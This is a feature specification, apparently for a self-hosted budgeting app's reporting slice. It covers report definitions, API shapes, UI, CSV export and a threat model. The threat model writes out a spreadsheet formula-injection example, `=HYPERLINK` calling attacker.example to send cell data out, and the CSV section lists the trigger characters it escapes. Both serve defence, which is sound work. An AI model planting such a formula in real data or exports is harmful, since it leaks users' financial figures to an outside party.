# Feature: Reporting and insights

- **Slice:** 13
- **Status:** Done (slice 13). Both reports, their CSV representation, the `/insights` page, the
  generated demo fixtures and the user guide have shipped. See
  [What slice 13 has built](#what-slice-13-has-built), which lists every place the build departs
  from the text below and why. The open questions were answered on 2026-11-25; see
  [Decisions](#decisions).
- **Owner:** Repository owner
- **Last updated:** 2026-11-25
- **Depends on:** accounts (3), categories (4), transactions (5), bills & income (7), transfers (8)
- **Related:** ADR-0006 (money), ADR-0008 as amended by ADR-0017 (scoping), ADR-0016 (nothing
  leaves the box), ADR-0022 (currency), ADR-0023 (i18n), ADR-0025 and ADR-0035 (plan records are
  not transactions), ADR-0026 (one household per instance), ADR-0027 (the assistant),
  ADR-0031 (an envelope's period is a label), ADR-0033 (a transfer is a linked pair),
  `transactions.md`, `categories.md`, `transfers.md`, `debt-plan.md` (the shared chart)
- **Designs:** `design/canvas/`. `design/README.md` lists no reports screen, and it lists no
  per-screen artboards at all. **The canvas itself does have one.** Three artboards are relevant:
  - *Insights — 12 months of history*: a mobile screen, light mode only. **Insights** is the
    fourth tab in the mobile nav (Home · Money · Bills · Insights).
  - *Web home — the month, the plan, and the ledger on one screen* and *Web home — dark*: the
    desktop home page carries an **Income vs spending** card.
  - There is **no desktop Insights artboard** and **no dark mobile Insights artboard**. The
    desktop **Insights** item exists only as a pill in the top nav.

  The screens are described in words under [UI](#ui), so nobody needs to open the canvas.

## Purpose

Reports answer the questions a household asks looking back. Where did the money go? Did we keep
any? Is this month unusual? Every other screen in Budget Owl looks at **this month's plan**: what
is left, what is due, which envelope is nearly empty. This one looks at **what actually happened**
in the ledger across months.

"Insights" means **plain observations computed from those figures**, such as *"Kept an average of
£906 a month. Best month was June, at £1,410."* It does **not** mean a model, an external service
or anything that leaves the instance. That is slice 17, which is optional and local-first, and
ADR-0027 shapes it. Nothing in this slice makes an outbound network call.

## User stories

- As a member, I want to see income against spending month by month, so I can tell whether we are
  keeping anything and whether that is getting better.
- As a member, I want to see where last month's spending went by category, and which categories
  moved compared with the month before.
- As a `VIEWER`, I want to see every report a member sees, and change nothing (there is nothing to
  change).
- As a member with accounts in two currencies, I want each currency reported on its own terms
  rather than added together at a rate I never agreed to.
- As a member who uses a screen reader, I want the figures behind every chart as a table.
- As a self-hoster, I want to take the figures out as a CSV file. *(Decision 8.)*

## Prerequisites

Transactions (5) are what reports sum. Categories (4) are their main axis. Transfers (8) are what
they must exclude. The roadmap also lists bills & income (7). The first cut **reads
nothing from bills**: bills are plan records (ADR-0025). Variance against the plan is deferred
(decision 3). Nothing needs a connected account, an import or a rate source.

## Rules and behaviour

### What counts: the ledger, and only the ledger

**A report sums `transactions` rows. Nothing else.** The domain model warns that three other record
types look like money moving and are not ledger entries:

| Record                                 | Counted? | Why                                                                                                                                                          |
| -------------------------------------- | -------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `transactions`, any `status`           | **Yes**  | The ledger. `PENDING` is included because an account's balance includes it (`TransactionRepository.totalsByAccount` has no status filter). The two must agree |
| `envelope_entries` with no transaction | No       | A `MANUAL` entry is an amount somebody logged against a plan, not a ledger row. *Decision 5*                                                                 |
| `bill_occurrences` marked `PAID`       | No       | ADR-0025: "only the real `Transaction` it matched contributes to income and expense. Counting both is the obvious bug this model invites"                    |
| `debt_payments`                        | No       | ADR-0035: a plan record that writes no transaction                                                                                                           |
| An account's `openingBalance`          | No       | It has no date and is not a movement. Counting it would turn every new account into a month of income                                                       |

### Transfers are excluded, both legs, never netted

Every report query carries **`t.transfer_group_id IS NULL`**. Both legs are excluded; they are not
cancelled against each other. ADR-0033 and `transfers.md` require this because a cross-currency
pair does not sum to zero, and subtracting one leg from the other needs a rate the instance may not
have.

**The trap is the uncategorised bucket.** `ck_transactions_transfer_has_no_category` guarantees a
transfer leg has a `NULL` category. So a query that joins to categories drops transfers by
accident. A query that reports `category_id IS NULL` as "uncategorised" picks up **every transfer
leg in the household** unless it filters them out explicitly. The ledger's "Needs a category"
queue already learned this (`TransactionRepository`, `t.categoryId is null and t.transferGroupId is
null`). The report states the predicate once, on the base query, rather than relying on a join.

### Income, spending, uncategorised and kept

For one currency and one month, over non-transfer transactions:

| Figure             | Definition                                               | Sign on the wire                                              |
| ------------------ | -------------------------------------------------------- | ------------------------------------------------------------- |
| `income`           | `Σ amount` where the category's `kind = INCOME`          | Positive when money arrived. **Net**, so a clawback reduces it |
| `spending`         | `−Σ amount` where the category's `kind = EXPENSE`        | **Positive when money left.** Net, so a refund reduces it    |
| `uncategorisedIn`  | `Σ amount` where `category_id IS NULL` and `amount > 0`  | Positive                                                      |
| `uncategorisedOut` | `−Σ amount` where `category_id IS NULL` and `amount < 0` | Positive                                                      |
| `kept`             | `Σ amount` over **every** non-transfer row               | Signed. Negative means the household spent more than came in  |

So `kept = income − spending + uncategorisedIn − uncategorisedOut`, exactly, by construction. It
equals the net movement of the ledger, which does not depend on how tidy anyone's categorising
is. For a single-currency household it is also the change in the total balance of its accounts,
because same-currency transfers net to zero inside that total.

**Refunds and negative amounts.** `transactions.md` rule 1 makes a positive amount in an expense
category an ordinary refund. It is **netted into that category's spending**, never reported as
income, and never rejected. If a category's refunds exceed its spending in a month, its spending
for that month is **negative and shown as negative**. It is never clamped to zero, following the
precedent bills set for `left`. A negative amount in an income category, such as a salary
correction, is netted the same way. Zero amounts cannot exist (`ck_transactions_amount_nonzero`).

**Uncategorised rows are their own term.** They are neither income nor spending, because the app
would be guessing which one they are. They are shown beside the two, with a link into the ledger's
"Needs a category" filter, because that queue is how the figure gets smaller. *Decision 4.*

A category's `kind` is fixed at creation (`categories.md` rule 3), so a category's history never
changes sides.

### Months, ranges and time zones

- **A month is the calendar month of `transactions.date`.** That column is a `date`, not a
  timestamp. V12 says so deliberately, so that one purchase cannot fall in two different months
  for two members in different zones. **No time-zone conversion happens anywhere in the
  aggregation.**
- **Ranges are whole months, inclusive at both ends**: `from=2025-09&to=2026-08` is twelve months.
  The query uses a half-open date range, `date >= from.atDay(1) AND date < to.plusMonths(1).atDay(1)`,
  with the bare column on the left so that `ix_transactions_household_date` can serve it. It never
  uses `date_trunc(date)` in the `WHERE` clause.
- **Every month in the range is present in the response**, with zeros where nothing happened. The
  series is dense, so a chart point and a table row exist for every month, and a quiet month reads
  as quiet rather than missing.
- **The maximum span is 24 months per request.** The designs offer 12, 6 and 3. Twenty-four leaves
  room for a twelve-month view with the same twelve months a year earlier beside it. A longer
  request is a `422 report-range-too-long`. *Decision 11.*
- **`from` and `to` are required. The server supplies no default range.** The client derives "the
  last twelve months" from the member's own device date, which is the only party that knows the
  member's local "today".
- **The in-progress month.** The server marks each month `complete: false` when it is the current
  or a later month by the application `Clock`. That clock is `CoreConfig`'s `Clock.systemUTC()`,
  injected so tests can fix it. Averages and the "best month" use complete months only, because a
  half-finished month always looks like a good month for keeping money. Near a month boundary, a
  household well east or west of UTC will disagree with the server for up to about fourteen hours
  about which month is current. That is an accepted risk (see the threat model) and a house-wide
  fact, not something specific to this slice. *Decision 10.*
- **There is no configurable month start.** ADR-0031 anticipated that slice 9 would add one
  (*"when slice 9 makes a month start on the 25th"*). Slice 9 shipped without it: `instance_settings`
  has no such column. Reports use calendar months. If a month start is ever added, reports must
  follow it. Because reports are computed on request, adopting it would rewrite no stored figure.

### Currencies

The model allows a household to have accounts in several currencies (ADR-0022). Each account has
its own currency and every transaction is in its account's currency. So:

- **Every figure is computed and returned per currency, never across currencies.** The response
  is grouped by `currency`. The household's base currency comes first, then the others in ISO code
  order. The base currency always appears, even when every month is zero, so the page always has a
  default to open on. Another currency appears only if it has at least one non-transfer
  transaction in the scanned range.
- **There is no converted roll-up in the first cut.** ADR-0022's follow-ups say the `ExchangeRate`
  entity and the roll-up "land with the reporting slice". They go in a separate follow-on slice
  instead (*decision 9*), which has no roadmap row yet. Without them, a two-currency household sees two complete,
  correct reports. With them it would see a third, labelled figure. Nothing in the first cut has
  to change for that to be added later.
- The display currency (ADR-0022) changes nothing here until a converted figure exists to display.

### Report 1: income and spending, by month

The designs' headline. For each currency it gives one row per month in the range, carrying the five
figures above and `complete`. It also gives:

- `averageKept`: the mean of `kept` over the **complete** months in the range. `BigDecimal` division
  at scale 4 with `HALF_EVEN`. `null` when no month in the range is complete.
- `bestMonth`: the complete month with the highest `kept`. Ties go to the **earliest** such month,
  so two reads of the same data agree. `null` when no month is complete.
- `completeMonths`: how many months the two figures above were taken over. Without it, *"an
  average over 11 months"* and *"over 12"* look the same.

### Report 2: spending by category

*"Where August went."* For a range, usually one month, it gives spending per **expense** category,
compared with **the immediately preceding range of the same length**. August is compared with July.
June to August is compared with March to May.

- **The response is a two-level tree, matching the category tree.** A top-level row's figure
  includes its children. It also carries `direct`, which is spending filed on the parent itself, so
  the children plus `direct` add up to the parent exactly. The page shows top-level rows and lets
  each one open to its children.
- **The tree is today's tree.** A category moved under a new parent last week carries its whole
  history to the new parent. A deleted category's transactions are "Needs a category" now
  (`fk_transactions_category ON DELETE SET NULL`), so they appear under uncategorised in **past**
  months too. This is the honest consequence of computing on request, and it is the right one: a
  report that kept the old tree would need a snapshot of every category edit.
- **Archived categories are reported** and carry `archived: true`. Archiving hides a category from
  pickers. It does not erase what was filed under it.
- A category appears if it has non-zero spending in **either** the range or the comparison range.
  So *"Dining: £0, down from £381"* is shown, not dropped.
- Rows are ordered by `spending` descending, then name, then id. Deterministic, like the debt plan's
  ladder.
- `change` is `(spending − comparedSpending) ÷ |comparedSpending|` as a decimal string at scale 4
  (`"0.1602"`), computed on the server with `HALF_EVEN`. It is `null` when `comparedSpending` is
  zero, because a rise from nothing has no percentage. The client formats it as a percentage with
  `Intl` and does **no** arithmetic on money. That is the same rule that left the debt plan's
  comparison sentence without a difference figure.
- `share` is the row's fraction of the currency's positive spending total, at scale 4, for the
  proportion bar. It is `null` for a row whose spending is zero or negative. A refund-heavy category
  has no slice of a bar.
- The uncategorised outflow for the range is reported beside the tree, with its count. It is not
  put inside the tree: it is not a category.
- Income by category is **not** in the first cut. The designs do not show it.

### Insights: plain computed observations

Two observations, both direct readings of the reports above. Every number in them comes from a
response field. The client composes the sentence from a translation key (ADR-0023) and does no
arithmetic:

1. **Kept on average, and the best month**: *"Kept an average of £906 a month. Best month was June,
   at £1,410."* From `averageKept` and `bestMonth`. When a month in range is incomplete, the
   sentence says how many months it covers.
2. **What moved**: the per-category `change` on report 2, rendered beside each row (*"Groceries
   £612, up 16%"*).

**Not in this slice**, and why. *Decision 7.*

- The canvas's *"Pattern worth knowing"*: *"Every month with a 5th Saturday, dining runs about $90
  higher. September has one."* That is a statistical claim. Twelve months of history contain about
  four months with a fifth Saturday, so the "pattern" would usually be noise presented as a
  finding. And this app labels every inferred figure as inferred.
- The desktop home's *"Groceries are $84 over your usual pace. Moving $60 from Dining… · Move $60 ·
  Not now"*. That is a **proposal that writes** to envelopes. A proposal is either the assistant's
  (slice 17, ADR-0027: "a proposal until a human confirms it") or the weekly check-in's (slice 14).
  It is not a report. "Usual pace" is also not defined anywhere.
- The envelope log's *"Biggest entry"*, *"Most frequent"* and *"Where it went by payee, top 5"*.
  These are envelope-log features and belong to `envelopes.md`, not here.

### Computed on request, not cached

**Every figure is computed from the ledger on each request. Nothing is stored or cached.** The
reasons:

1. **The volume is small and bounded.** One household per instance (ADR-0026). A busy household
   records perhaps a few thousand transactions a year. The 24-month cap means one report scans a
   small multiple of that. Report 2 scans up to twice the requested span, because of the
   comparison range: at most 48 months. **Measured**, against 50,000 transactions over ten years:
   10 ms for the 24-month report 1 scan and 19 ms for the 48-month report 2 scan, in the
   database; 14 ms and 22 ms end to end through the service. See
   [Query plans, measured](#query-plans-measured).
2. **A cache would have many invalidation paths, and every one is a way to be wrong.** It would go
   stale on a transaction create, edit or delete; a transfer edit; a category delete (the `SET
   NULL` happens in the database, invisible to the application); a category move; an import
   (slice 12); two rows paired into a transfer or a transfer split back (slice 12); and any future
   month-start setting. A wrong report looks exactly as plausible as a
   right one.
3. **It is what the rest of the app already does.** Balances, envelope remaining, overdue bills and
   the debt projection are all derived on read. `domain/model.md` says a cached balance "is a
   materialized projection with a rebuild path — and that needs an ADR". A cached report is the
   same kind of thing and would need the same ADR.

**Indexes.** On a single-household instance `household_id` selects every row, so the **date range**
is the selective predicate. The plans below confirm the first cut needs no index. `ix_transactions_household_date (household_id, date DESC, id DESC)`
serves it, with `household_id` as the leading equality column. Report 2's grouping can use
`ix_transactions_household_category`, which is partial on `category_id IS NOT NULL`. The
uncategorised bucket goes back to the date index. **The first cut adds no index.** The database
style guide says "don't index speculatively". The implementation runs `EXPLAIN ANALYZE` against a
seeded household and records the plan here. Only a plan that shows a problem justifies a covering
index, for example `(household_id, date) INCLUDE (amount, category_id, account_id,
transfer_group_id)`, and that index would come in its own migration with the measured reason beside
it.

**One query per report per scan.** Each report is one grouped query: by month, by account currency
(joined from `accounts`) and by category, using `sum(case …)` for the signed splits. Hibernate 6
JPQL supports `extract(year/month from …)` and `case`, so `database-style.md`'s "no native SQL
unless genuinely impossible" should hold. If it does not, the native query is parameterised and
the comment says why.

### CSV export

It ships in the first cut (*decision 8*). This is the shape:

- **The same two resources, a second representation.** `GET` with `Accept: text/csv` returns
  exactly the rows the on-screen table shows, so the export and the table cannot disagree. There
  is no export endpoint and no verb in a path.
- **Headers are stable column codes, not prose**: `currency,period,income,spending,…`. That keeps
  ADR-0023's "codes over prose" without making the server choose a language. Amounts are the
  wire's plain decimal strings (`-1234.5000`), not locale-formatted. Periods are `2026-08`. UTF-8
  with a byte-order mark, because without one Excel mis-decodes every non-Latin category name, and
  ADR-0023 wants those names to exist.
- **RFC 4180 quoting on every field**, with embedded quotes doubled.
- **Formula-injection escaping on every text cell.** Category names, and in any later export
  account and payee names, are user-controlled. From slice 12 onwards, payee names also come from
  **bank files**, which means third parties control them. A cell whose first character is `=`,
  `+`, `-`, `@`, a tab (`0x09`) or a carriage return (`0x0D`), **or the full-width forms `＝` `＋`
  `－` `＠`** (which some spreadsheets fold to their ASCII equivalents), is prefixed with a single
  quote `'` before quoting, following OWASP's guidance. After the slice-13 security audit the
  list also covers a line feed, the small forms `﹦` `﹢` `﹣` `﹫` and the minus sign `−`
  (`U+2212`), and the test looks **past any leading whitespace, control or format characters**
  (NBSP, zero-width space, BOM): `" =HYPERLINK(…)"` is escaped, because a reader may trim the
  blank and then evaluate. The value itself is never trimmed. This is the same list as
  `file-import.md`, and one shared escaper serves both. Amount, period and currency cells are produced by
  the server from typed values and must match `^-?\d+\.\d{4}$`, `^\d{4}-\d{2}$` or `^[A-Z]{3}$`.
  They are exempt, so a negative amount stays a number. The exemption is by **column type**, never
  by sniffing the value: a category named `-5` is a text cell and is escaped.
- `Content-Disposition: attachment; filename="budget-owl-income-and-spending-2025-09-2026-08.csv"`.
  The filename is built from the validated periods only. No household or category name goes into a
  header.
- `Cache-Control: no-store`, as on every authenticated response (`security-model.md`). The CSV is
  not JSON, so a test asserts it rather than assuming the global rule covers it.
- A **whole-ledger export** (every transaction) is a different feature and is out of scope.

## Data model

**No new tables and no migration in the first cut.** Every figure is derived from `transactions`,
`accounts` (currency), `categories` (kind, parent, name, archived) and `households`
(`base_currency`). See `../domain/model.md`.

Read-only by construction: the reporting service holds no repository method that writes.

A future `ExchangeRate` table (ADR-0022) is the first schema this feature would add. It belongs to
the follow-on slice in decision 9.

**Glossary.** The designs' **Kept** (*"Avg kept $906/mo"*) is the `kept` figure above, defined in
`../memory/glossary.md`. It is distinct from **Left over**, which is a plan figure for one month.

## API

Both endpoints are `GET`. Both are authenticated, household-scoped and open to every role,
`VIEWER` included. Neither takes an id of any kind.

| Method | Path                                                        | Purpose                                                 | Auth       |
| ------ | ----------------------------------------------------------- | ------------------------------------------------------- | ---------- |
| `GET`  | `/api/reports/income-and-spending?from=2025-09&to=2026-08`  | Report 1, per currency, one row per month               | any member |
| `GET`  | `/api/reports/spending-by-category?from=2026-08&to=2026-08` | Report 2, the category tree against the preceding range | any member |

Each also answers `Accept: text/csv` (decision 8). No other method exists
under `/api/reports`, and a test holds that.

**These are documents, not collections.** `api-style.md` requires a page envelope on every
collection, and these responses carry arrays. They are bounded the way `/api/debt-plan` and
`/api/periods/{period}/summary` are bounded:

- months are at most 24 (the span cap);
- category rows are at most 200 (the per-household category cap, `categories.md` rule 7);
- currencies are at most the distinct currencies of the household's accounts.

A page boundary falling in the middle of a report would make its totals unreadable. The bound is
the control, and the threat model lists it.

**Query parameters.** `from` and `to` are required and must match `^\d{4}-(0[1-9]|1[0-2])$` at the
edge. That is four digits exactly, so Java's `YearMonth.parse` never sees a signed or five-digit
year such as `+10000-01`. Then:

| Code                    | Status | When                                                  |
| ----------------------- | ------ | ----------------------------------------------------- |
| `validation-failed`     | 400    | `from` or `to` missing or malformed, naming the field |
| `report-range-invalid`  | 422    | `from` is after `to`                                  |
| `report-range-too-long` | 422    | More than 24 months, with the limit in `params`       |
| `not-a-member`          | 403    | Authenticated, but in no household                    |

The URL carries only two periods, so nothing sensitive reaches an access log. Compare the debt
plan's preview, which had to move an amount out of a query string.

**`GET /api/reports/income-and-spending`**

    {
      "from": "2025-09",
      "to": "2026-08",
      "baseCurrency": "GBP",
      "currencies": [
        {
          "currency": "GBP",
          "months": [
            {
              "period": "2025-09",
              "income": "5240.0000",
              "spending": "4334.0000",
              "uncategorisedIn": "0.0000",
              "uncategorisedOut": "54.8000",
              "kept": "851.2000",
              "complete": true
            }
          ],
          "averageKept": "906.0000",
          "bestMonth": { "period": "2026-06", "kept": "1410.0000" },
          "completeMonths": 11,
          "uncategorisedCount": 3
        }
      ]
    }

**`GET /api/reports/spending-by-category`**

    {
      "from": "2026-08",
      "to": "2026-08",
      "comparedFrom": "2026-07",
      "comparedTo": "2026-07",
      "baseCurrency": "GBP",
      "currencies": [
        {
          "currency": "GBP",
          "spending": "3131.0000",
          "comparedSpending": "3070.5000",
          "categories": [
            {
              "categoryId": "…",
              "name": "Groceries",
              "archived": false,
              "spending": "612.0000",
              "comparedSpending": "527.6000",
              "change": "0.1600",
              "share": "0.1955",
              "direct": "612.0000",
              "children": []
            }
          ],
          "uncategorised": { "spending": "54.8000", "count": 3 }
        }
      ]
    }

Every amount is a string at scale 4 and sits inside an object that names its currency (ADR-0006,
`api-style.md`). There is never a JSON number, never a formatted amount and never a converted
figure.

## UI

Route **`/insights`**, named **Insights** in the nav, as the designs name it: the fourth tab on
mobile and a top-nav item on desktop. It is shown at 390px and at desktop width, light and dark
(non-negotiable #10). Every value comes from `frontend/src/styles/tokens.css`. The Flutter app
(slice 15) consumes the same two endpoints.

### Mobile (from *Insights — 12 months of history*)

Top to bottom:

1. **Insights** heading, in the display face.
2. **Range chips**: *12 mo* · *6 mo* · *3 mo*, with 12 selected. A group of buttons carrying
   `aria-pressed`, the same pattern as the debt plan's strategy control. Changing a chip saves
   nothing; it re-requests report 1 with a new `from`.
3. **Income vs spending** card, on a card surface with `--radius-lg` and `--shadow-sm`. The
   small-caps label sits on the left and the short insight, *"Avg kept £906/mo"*, on the right in
   `--color-accent-2-700`. Below them: the chart, the legend (Income · Spending) and the range
   label. The canvas writes the range as *"Sep 25 → Aug 26"*, which reads as two dates. It is
   rendered through `Intl` as month and year (*"Sep 2025 – Aug 2026"*).
4. **Where {month} went** card. A proportion bar, then one row per top-level category: a dot, the
   name, the amount and the change. The canvas shows four rows. The page shows every row, and
   rows past the sixth go behind a *"Show all"* disclosure.
5. Beneath report 1's chart, a **"Needs a category"** line when `uncategorisedCount > 0`
   (*"3 transactions need a category — £54.80 isn't counted as income or spending"*). It links to
   `/transactions` with the uncategorised filter.

### Desktop (from *Web home*'s Income vs spending card. No Insights artboard exists)

The two cards side by side at the same breakpoint the debt plan uses (48rem), with the same fields
in the same order as mobile (`design/README.md` rule 1). On desktop, report 1's insight is the
long form: *"Kept an average of £906/mo. Best month was June, at £1,410."* The card on the desktop
**home** page belongs to whichever slice builds the home page, which reads the same endpoint. This
slice builds `/insights`.

### Charts, and reusing the debt plan's approach

**Report 1 uses the shared `LineChartComponent`** (`shared/components/line-chart.component.ts`).
It is inline SVG with no library and no CDN, plots months on a shared axis, never resamples, and
converts amounts to `number` only as dimensionless ratios through `core/money.ts`. Two things carry
over unchanged, and two need small changes:

- **Unchanged.** Each series carries a required `said` sentence. That sentence is the chart's text
  alternative, composed from the same response fields: *"Income: £5,240 in September 2025 to
  £5,610 in August 2026."* The coincident-lines rule also stays. A household whose income and
  spending match month after month gets one stroke and a sentence saying so, not two keys over one
  line.
- **Roles.** The component's two roles are `selected` and `compared`, which are named for the debt
  plan. Income and spending are peers. The implementation either renames the roles to something
  neutral or adds a peer pair. **The rule that must survive is weight and dash, never colour
  alone** (WCAG 1.4.1). The canvas draws both lines solid, income in `--color-accent-2-500` and
  spending in `--color-accent`, so they differ only by colour. The page keeps those two tokens as
  the strokes (stepping to the 400 tints in dark mode, as every accent does) and adds the
  component's dash to one of them.
- **Negatives.** The component clamps a point below zero to the baseline, which was right for a
  debt balance. Here, income and spending are normally non-negative. A month where refunds beat
  spending is drawn at the baseline and stated as negative in the table and the `said` sentence.
  `kept` is **not** charted, because it is often negative. It appears in the table and in the
  insight.

**The proportion bar** in report 2 is decorative (`aria-hidden="true"`). The rows beneath it carry
every name and figure, and the bar is only a picture of their `share`. It uses the canvas's
segment tokens in order: `--color-accent`, `--color-accent-500`, `--color-accent-2-500`,
`--color-accent-2-400`, `--color-neutral-500`, `--color-neutral-300`, and the last for anything past
the sixth row. Colour carries no information the rows do not also carry in text.

**The direction of change is said in words, not only in colour.** The canvas colours a rise in
spending `--color-accent-700` and a fall in `--color-accent-2-700`. The page keeps that and adds
the word and the sign (*"up 16%"*, *"down 22%"*). It shows *"flat"* when `change` is exactly zero
(compared as strings through `core/money.ts`, never parsed) and *"new"* when `change` is `null`
and there was spending this period.

### The table alternative

**Every chart has a real table**, behind a *"Show the figures"* disclosure directly below it. It is
a `<table>` with a `<caption>`, `<th scope="col">` for Month, Income, Spending, Needs a category
(in and out) and Kept, and `<th scope="row">` for each month. Incomplete months are marked *"so
far"*. The visually hidden description on the SVG stays as well: the description summarises and
the table enumerates. The table is also exactly the CSV's rows.

### States

- **No transactions in range**: a sentence (*"Nothing recorded between September 2025 and August
  2026 yet"*) and a link to record one. There is no flat line and no £0 average. Same rule as the
  debt plan's empty state.
- **Only envelope entries, no transactions**: the page says that Insights counts transactions, and
  that amounts logged straight into an envelope do not appear here (decision 5).
- **Several currencies**: a currency switcher above both cards, defaulting to the base currency and
  naming how many others exist. Each currency is a complete report. There is never a combined
  figure.
- **`VIEWER`**: identical. The page has no write control to hide.

A **user-guide page ships with the slice** (non-negotiable #11). It is captured from the running
UI against `tools/ui/fixtures/demo-data.ts`, which needs about 12 months of categorised
transactions, a refund, a transfer and one uncategorised row adding.

## Security considerations

Threat-modelled before implementation (`/threat-model`, 2026-11-25), against
`../architecture/security-model.md`. Reporting touches **data access and disclosure**. It does not
touch authentication, sessions, CSRF tokens or cookies, and it changes none of them.

### Assets

Aggregates are easy to mistake for harmless because no single transaction is visible in them. They
are not harmless.

- **Monthly income** is a salary figure, and its month-to-month shape shows irregular work, a lost
  job or a new one.
- **Spending by category** is a lifestyle profile. A household's own category names make it
  sharper: *"Therapy"*, *"IVF"*, *"Gambling"*, *"Debt collector"*. One name with one figure
  discloses more than a page of the ledger, because the household has already done the
  classifying.
- **`kept`, `averageKept` and `bestMonth`** amount to a statement of disposable income.
- **The CSV** is all of the above in a file that leaves the browser's protections and lives on a
  disk, in a downloads folder, and possibly in a cloud-synced directory.

### Actors

Per the skill: an unauthenticated stranger; an authenticated user who is not a member of this
household (for example an instance administrator with no membership, or a removed member whose
session survives); a `VIEWER`; a `MEMBER` or `OWNER` planting content for another member; a
hostile page in a member's browser; and a stolen session or bearer token.

### Entry points

1. `GET /api/reports/income-and-spending`: parameters `from` and `to`; JSON or CSV.
2. `GET /api/reports/spending-by-category`: parameters `from` and `to`; JSON or CSV.
3. The `Accept` header, which selects the representation.
4. **Stored input reaching a new sink.** Category names were typed through `/api/categories`. From
   slice 12 onwards, payee names will arrive from bank files. Both reach a spreadsheet for the
   first time through the CSV.

No background job, no file upload, no new cookie, no new header that is read beyond `Accept`, and
no outbound call.

### Attacks considered

**Live, and controlled:**

1. *A member calls `GET /api/reports/income-and-spending` and gets totals that include another
   household's transactions, because the aggregate query joined `transactions` to `accounts` with
   no household predicate.* **The composite foreign keys do not stop this.** They stop a row
   *referencing* another household's row. An aggregate with a missing `WHERE` sums every
   household's rows legitimately. ADR-0026 means one household per instance today, so this would
   be latent until a managed deployment existed, and then it would be a full breach.
   **Control:** the household comes from the caller's verified membership (`MembershipService`),
   never from the request. **Every table in the query carries its own `household_id = :householdId`**:
   `transactions`, `accounts` and `categories`. That follows `TransactionRepository.totalsByAccount`,
   which predicates both of its tables. The enforcement is in the repository query, called only
   from the service.
2. *An authenticated user who belongs to no household calls either endpoint and gets* any figure at
   all. **Control:** membership resolution answers `403 not-a-member` before any query runs.
   Enforced in the service, as on every other financial route.
3. *A member names a category `=HYPERLINK("https://attacker.example/?"&B2,"Open")`. A second
   member exports spending by category and opens the file in a spreadsheet, and gets* their own
   figures sent to the attacker's server with one click, or a DDE payload in older tools. From
   slice 12 onwards, the same is true of a merchant descriptor in an imported file, which nobody in
   the household wrote. **Control:** the CSV writer escapes every text-typed column as specified
   under [CSV export](#csv-export). The exemption is decided by column type, and the server
   validates that the typed columns match their patterns before writing. Enforced in one CSV
   writer in the reporting web layer, which a test exercises directly.
4. *A caller sends `from=0001-01&to=9999-12` and gets* a scan of the whole ledger plus a response
   of 119,988 dense month rows, repeated in a loop. **Control:** the four-digit pattern at the
   edge, and the 24-month span cap in the service before the query is built (`422
   report-range-too-long`). Report 2's comparison doubles the scanned span to at most 48 months.
   That is deliberate and bounded.
5. *A caller sends `from=+10000-01` and gets* a `500` with a stack trace from `YearMonth` arithmetic
   overflowing, at `ERROR` in the log and loopable. Slice 10 met this shape with `payoffMonth`.
   **Control:** the edge pattern rejects anything that is not exactly four digits, a hyphen and a
   month, with `400 validation-failed`.
6. *An operator turns logging to `DEBUG` to chase a bug and gets* every member's monthly income and
   category names in the log file, because Spring MVC logs the returned body's `toString` and a
   record prints every component. **Control:** a redacted `toString` on every report record and
   DTO. The CSV body is never logged. Audit lines carry the user id, the endpoint and the periods,
   and no figure. The query uses projections rather than entities, so Hibernate's `EntityPrinter`
   (pinned to `INFO` already) has nothing to print.
7. *A shared computer's browser cache or an intermediate proxy keeps a report response, and the next
   person gets* the household's income. **Control:** `Cache-Control: no-store` on both
   representations. Asserted on the CSV specifically, because the global rule is described in
   terms of JSON.
8. *An insight is computed by sending figures to an outside service, and the operator gets* their
   household's spending profile in someone else's logs. This would be against ADR-0016 and
   ADR-0027. **Control:** there is no such call. Every insight is server arithmetic over the
   ledger. An **ArchUnit** rule (ADR-0024) holds that the reporting package depends on no HTTP
   client (`RestClient`, `WebClient`, `java.net.http`), so adding one fails the build rather than a
   review.

**Ruled out, with reasons:**

- **Object-level access by id.** The reports take no id, so there is nothing to enumerate and no
  `403`-versus-`404` oracle. A later filter such as `accountId` would reintroduce this, and would
  have to resolve through the scoped query and answer `404`, like every id elsewhere.
- **A `VIEWER` reading reports.** This is the feature, not an elevation. A `VIEWER` already reads
  every transaction these figures are summed from.
- **CSRF.** Both routes are `GET` with no side effects. A hostile page can cause a top-level
  navigation that carries the `SameSite=Lax` cookie, but it cannot read the response: the CORS
  allowlist is explicit and never `*`. A navigation sends `Accept: text/html`, so it does not even
  trigger a CSV download. The worst case would be the member's own data landing on the member's
  own disk.
- **Tampering and repudiation.** The slice writes nothing. Reads are not audited anywhere in the
  application, and this slice matches that rather than starting a read-audit trail alone.
- **XSS through category names in the chart or table.** Every name reaches the DOM through Angular
  interpolation or `[attr.aria-label]` binding, never `innerHTML` or `bypassSecurityTrust*`
  (`angular-style.md`). The SVG draws no user text at all: the legend and the description are HTML.
- **SQL injection through `from` and `to`.** They are parsed to `YearMonth` and bound as `date`
  parameters. There is no sort parameter, so there is no `ORDER BY` input to allowlist.
- **Timing or size as an oracle.** Response size varies with how many categories had spending. A
  caller who can make the request is already entitled to the response.

### Controls, and where each is enforced

| Control                                                            | Layer                                                              |
| ------------------------------------------------------------------ | ------------------------------------------------------------------ |
| Household from verified membership, never from the request        | Service (`MembershipService`)                                      |
| `household_id` predicate on **every** table in each aggregate      | Repository query                                                   |
| `403 not-a-member` before any query                                | Service                                                            |
| Transfers excluded on the base query (`transfer_group_id IS NULL`) | Repository query, once                                             |
| `from`/`to` four-digit month pattern                               | Edge (`@Pattern` on the request parameters)                        |
| 24-month span cap; `from ≤ to`                                     | Service, before the query is built                                 |
| Bounded arrays in place of pagination                              | Span cap; category cap (`CategoryService`, 200)                   |
| No write route under `/api/reports`                                | Controller; asserted by test                                       |
| CSV formula-injection escaping, by column type                    | One CSV writer in the reporting web layer                         |
| `Cache-Control: no-store` on JSON and CSV                          | Security configuration; asserted per representation               |
| No figures or names in logs                                        | Redacted `toString` on every report record; audit lines carry ids |
| No outbound network dependency                                     | ArchUnit rule on the reporting package                             |

### Accepted risks

- **No rate limit on the report `GET`s.** The cost of one call is proportional to the household's
  own data under two caps, and there is no request parameter that multiplies it. The debt plan
  reasoned the same way about its plan read (`debt-plan.md`, Known gaps). Rate-limiting a
  household's own insights page on a two-person instance costs more than it buys.
- **The month-boundary disagreement with a UTC clock**, described under
  [Months, ranges and time zones](#months-ranges-and-time-zones). It can only mark a month
  complete or incomplete a few hours early or late. It never moves a transaction between months.
- **A CSV, once downloaded, is outside our control.** Exporting is an explicit act by a member who
  can already read every figure in it. Nothing is sent anywhere by us.

## Edge cases

